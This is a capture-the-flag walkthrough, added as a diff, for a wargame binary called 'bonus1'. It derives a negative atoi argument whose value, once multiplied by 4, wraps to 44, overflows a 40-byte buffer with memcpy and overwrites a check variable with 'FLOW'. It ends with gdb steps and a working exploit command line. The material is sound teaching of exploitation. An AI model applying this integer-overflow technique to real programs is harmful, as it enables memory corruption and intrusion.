@@ -1,0 +1,42 @@
+after running dogbolt on bonus1, we find a somewhat obvious issue (if you are used to dealing with negative values and binary underflow/overflow)
+the objective is to get a variable initalized by an atoi to be 0x574f4c46, but this variable is tested to be <= 9 and then used by a memcpy (multiplied by 4)
+our objective is to pass a negative value that once multiplied by 4 gives us as size big enough (but not too much!) to verflow buff and memcpy argv[2] to i
+mathematically it does not make sense that a negative value times a positive value could give a positive value, but we are working in a finite range of values so numbers wrap from negative to positive (and positive to negative)
+so we need to find a value that respect the following formula (we will be using negative values, so we are using the two's complement rule):
+(two's complement rule: a negative value is equal to the one's complement + 1, so -1 == 11111111 in 8 bits, because if we add -1 and 1, it overflows back to 0, and two's complement of 0 is 0)
+((~x + 1) * 4) % (2 ^ 32) == 44 (44 because we want to override i and it is 4 bytes wide right after our buffer of 40 bytes)
+another way of seeing it is using binary (I will use 8 bit instead of 32 bit):
+
+0bxxxxxxxx
+* 4 (equivalent to a shift of 2 bits to the left, discarding the first 2 bits)
+0bxxxxxx00
+==
+0b00101100 (44)
+
+if we reverse the operations:
+we start from 44
+0b00101100
+we divive by 4 (shift of 2 bits to the right)
+0bss001011 (here ss could have been 00, 01, 10, 11 before the left shift)
+to get a negative value, we want the highest bit to be 1
+0b10001011 (139 or -117)
+
+so really what we can do is 11 + highest bit (2 ^ 31) then two's complement it to get it's positive representation (which we will prepend with a '-' for atoi to work as intended)
+0b10000000000000000000000000001011
+~ + 1
+0b01111111111111111111111111110101
+->
+2147483637
+->
+
+gdb bonus1
+b *0x8048478 (just after memcpy, before cmpl)
+r -2147483637 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
+x/x $esp+0x3c (should be 0x42424242)
+and it is :)
+
+by looking at cmpl, we can see that the number tested is in reverse (since we are in little endian), and curiously they all are in the range 0x41(A)-0x5A(Z), so this is probably a word
+after checking the ascii table, it is indeed the word FLOW
+
+so the final exploit should be:
+./bonus1 -2147483637 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFLOW
